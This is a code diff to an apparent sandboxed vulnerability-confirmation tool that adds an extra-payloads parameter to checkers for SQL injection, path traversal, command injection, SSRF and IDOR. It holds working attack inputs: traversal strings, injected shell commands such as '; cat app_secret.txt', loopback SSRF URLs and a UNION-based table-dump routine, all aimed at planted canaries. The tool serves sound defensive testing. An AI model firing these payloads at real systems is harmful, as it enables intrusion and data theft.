@@ -42,12 +42,20 @@ def _split_source(input_source: str) -> tuple[str, str]:
 _CREATE_TABLE = re.compile(r"CREATE TABLE\s+[\"'`]?(\w+)[\"'`]?\s*\((.*?)\)", re.IGNORECASE | re.DOTALL)
 
 
-def confirm_sqli(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+def confirm_sqli(
+    base_url: str, endpoint: str, input_source: str, timeout: float,
+    extra_payloads: list[str] | None = None,
+) -> ConfirmResult:
     """Generic UNION-based SQLite exfiltration -- not tied to any table name.
 
     Determines the column count, reads the schema out of sqlite_master, then dumps
     every user table's columns. The oracle decides success (did a canary appear),
     so this works on any SQLite-backed app, not just the seeded one.
+
+    ``extra_payloads`` is accepted for a uniform confirmer signature but ignored:
+    there is no environmental sentinel for SQLi. Confirming it still needs a
+    canary planted in the app's own data (a table the app never selects), which
+    is app-level instrumentation, not something the sandbox can supply.
     """
     _, param = _split_source(input_source)
     url = f"{base_url.rstrip('/')}{endpoint}"
@@ -118,9 +126,16 @@ def confirm_sqli(base_url: str, endpoint: str, input_source: str, timeout: float
 
 # --- Path traversal ----------------------------------------------------------
 
-def confirm_path_traversal(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+def confirm_path_traversal(
+    base_url: str, endpoint: str, input_source: str, timeout: float,
+    extra_payloads: list[str] | None = None,
+) -> ConfirmResult:
     _, param = _split_source(input_source)
     payloads = [
+        # Environmental sentinels planted OUTSIDE the app's root (manifest-less
+        # targets); tried first so a general run proves the escape via a canary
+        # Cerberus controls. Empty/None for the seeded (manifest) path.
+        *(extra_payloads or []),
         # Planted secret one level up from the served docs/ dir.
         "../app_secret.txt",
         "..%2fapp_secret.txt",
@@ -189,16 +204,21 @@ def _fire_get(base_url: str, endpoint: str, param: str, payloads: list[str], tim
 
 # --- Command injection -------------------------------------------------------
 
-def confirm_command_injection(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+def confirm_command_injection(
+    base_url: str, endpoint: str, input_source: str, timeout: float,
+    extra_payloads: list[str] | None = None,
+) -> ConfirmResult:
     """Append a command that reads the planted secret file; the oracle checks for the canary.
 
-    NOTE: the payloads read ``app_secret.txt`` -- the file canary planted on the
-    seeded target. A general run must instead reference the per-run canary path
-    Cerberus planted; wiring that through is part of generalizing beyond the
-    seeded targets.
+    ``extra_payloads`` carries the environmental variant for a manifest-less
+    target: the injected command reads the sandbox-planted sentinel file by its
+    per-run absolute path (see finder/env_canary.py). The literals below read
+    ``app_secret.txt`` -- the file canary planted on the seeded target -- and are
+    used on the manifest path.
     """
     _, param = _split_source(input_source)
     payloads = [
+        *(extra_payloads or []),
         "127.0.0.1; cat app_secret.txt",
         "127.0.0.1 && cat app_secret.txt",
         "127.0.0.1 | cat app_secret.txt",
@@ -211,12 +231,22 @@ def confirm_command_injection(base_url: str, endpoint: str, input_source: str, t
 
 # --- SSRF --------------------------------------------------------------------
 
-def confirm_ssrf(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
-    """Make the server fetch an internal-only endpoint; success is the canary coming back."""
+def confirm_ssrf(
+    base_url: str, endpoint: str, input_source: str, timeout: float,
+    extra_payloads: list[str] | None = None,
+) -> ConfirmResult:
+    """Make the server fetch an internal-only endpoint; success is the canary coming back.
+
+    ``extra_payloads`` carries the sandbox-planted internal listener URL for a
+    manifest-less target (see finder/env_canary.py): a loopback listener the
+    finder controls that only an SSRF can make the target fetch. The seeded
+    (manifest) path uses the target's own ``/internal/metadata`` route below.
+    """
     _, param = _split_source(input_source)
     base = base_url.rstrip("/")
     port = urlsplit(base).port
     payloads = [
+        *(extra_payloads or []),
         f"{base}/internal/metadata",  # the server can reach its own internal route
         *( [f"http://127.0.0.1:{port}/internal/metadata"] if port else [] ),  # published-port loopback inside the sandbox
         "http://127.0.0.1/internal/metadata",
@@ -227,11 +257,19 @@ def confirm_ssrf(base_url: str, endpoint: str, input_source: str, timeout: float
 
 # --- Auth bypass / IDOR ------------------------------------------------------
 
-def confirm_auth_bypass(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+def confirm_auth_bypass(
+    base_url: str, endpoint: str, input_source: str, timeout: float,
+    extra_payloads: list[str] | None = None,
+) -> ConfirmResult:
     """Request objects the caller does not own; the canary belongs to another user.
 
     Also spoofs a client identity header matching the requested id -- so a "fix"
     that merely trusts a client-supplied identity is caught here and NOT certified.
+
+    ``extra_payloads`` is accepted for a uniform confirmer signature but ignored:
+    IDOR/auth-bypass has no environmental sentinel. The proof is another user's
+    secret coming back, which must be seeded in the app's own data (app-level
+    instrumentation), so this class stays out of scope for env canaries.
     """
     _, param = _split_source(input_source)
     url = f"{base_url.rstrip('/')}{endpoint}"
